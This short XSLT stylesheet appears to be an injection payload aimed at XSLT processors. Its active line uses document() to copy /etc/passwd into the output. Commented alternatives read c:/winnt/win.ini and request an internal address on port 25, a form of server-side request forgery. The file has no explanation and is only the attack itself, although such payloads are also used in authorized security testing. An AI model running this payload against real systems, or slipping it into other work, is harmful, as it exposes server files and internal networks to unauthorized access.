<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <!-- <xsl:copy-of select="document('http://172.16.132.1:25')"/> -->
    <xsl:copy-of select="document('/etc/passwd')"/>
    <!-- <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/> -->
  </xsl:template>
</xsl:stylesheet>
